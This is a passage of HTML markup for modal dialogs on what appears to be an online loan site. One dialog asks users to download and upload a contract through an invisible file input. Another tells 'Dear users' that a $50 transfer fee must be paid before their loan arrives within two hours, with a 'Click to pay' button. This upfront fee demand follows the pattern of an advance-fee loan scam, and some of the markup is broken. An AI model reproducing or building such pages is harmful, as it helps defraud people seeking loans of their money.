              </svg>
            Click here to download contrat.</h5>
         
          <button type="button" class="close"  aria-label="Close" id="dowloadId">
            <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" fill="currentColor" class="bi bi-cloud-download-fill" viewBox="0 0 16 16">
                <path fill-rule="evenodd" d="M8 0a5.53 5.53 0 0 0-3.594 1.342c-.766.66-1.321 1.52-1.464 2.383C1.266 4.095 0 5.555 0 7.318 0 9.366 1.708 11 3.781 11H7.5V5.5a.5.5 0 0 1 1 0V11h4.188C14.502 11 16 9.57 16 7.773c0-1.636-1.242-2.969-2.834-3.194C12.923 1.999 10.69 0 8 0m-.354 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V11h-1v3.293l-2.146-2.147a.5.5 0 0 0-.708.708z"/>
            </svg>
          </button>
        </div>
        <div class="modal-body">
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-2-square-fill" viewBox="0 0 16 16">
                    <path d="M2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2zm4.646 6.24v.07H5.375v-.064c0-1.213.879-2.402 2.637-2.402 1.582 0 2.613.949 2.613 2.215 0 1.002-.6 1.667-1.287 2.43l-.096.107-1.974 2.22v.077h3.498V12H5.422v-.832l2.97-3.293c.434-.475.903-1.008.903-1.705 0-.744-.557-1.236-1.313-1.236-.843 0-1.336.615-1.336 1.306"/>

            </div>
            <div class="modal-bodyx">

                <path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5"/>

              <input type="file" style="opacity: 0;" id="uploadInput">

           </div>
        </div>
        <p id="pSms" style="text-align: center;">Click here to upload contrat</p>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" id="submitId">Save changes</button>

  <!-- Modal -->
  <div  style="background-color: rgb(250, 117, 117);" class="modal fade" id="TASK_PAIMENTID" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered" role="document">
      <div class="modal-content">
        <div class="modal-body">
            Dear users, 
            In order to receive your loan, it is necessary to pay the transfer fee of $50. Once the payment is completed, you will receive your loan within a maximum of 2 hours.
            We appreciate your understanding and cooperation.
            <form data-copy=true>
              <input id="linkInputx" type="text" data-click-select-all style="border: none !important; cursor: pointer; border-radius: 5px !important; opacity:0;"/>
            </form> 
            <p style="cursor: pointer; color: green !important; text-align: center; font-size: 15px !important;" id="affiliateIDxQ">
              <span class="icon"><i class="bi bi-copy"></i></span>
            </p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary">Click to pay</button>
        </div>
      </div>
    </div>
  </div>
  <div id="preloader"></div>
